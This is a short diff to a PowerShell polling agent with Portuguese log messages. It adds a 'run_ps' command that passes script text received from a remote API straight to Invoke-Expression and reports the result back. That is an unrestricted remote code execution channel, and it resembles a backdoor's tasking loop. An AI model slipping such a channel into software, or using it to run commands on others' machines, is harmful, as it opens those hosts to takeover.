@@ -381,6 +381,16 @@ function PollApi {
                     wLog 'Monitor RETOMADO.' 'OK'
                     SendAck $cmd $true
                 }
+                'run_ps'           {
+                    if ($data) {
+                        try {
+                            $result = Invoke-Expression $data 2>&1
+                            $out = if ($result) { ($result | Out-String).Trim() } else { '(sem saida)' }
+                            wLog "run_ps OK: $($out.Substring(0, [Math]::Min(200, $out.Length)))" 'OK'
+                            SendAck $cmd $true
+                        } catch { wLog "run_ps ERRO: $_" 'ERROR'; SendAck $cmd $false "$_" }
+                    } else { wLog 'run_ps: script vazio' 'WARN'; SendAck $cmd $false 'script vazio' }
+                }
                 default { wLog "Comando desconhecido: $cmd" 'WARN'; SendAck $cmd $false 'desconhecido' }
             }
         }
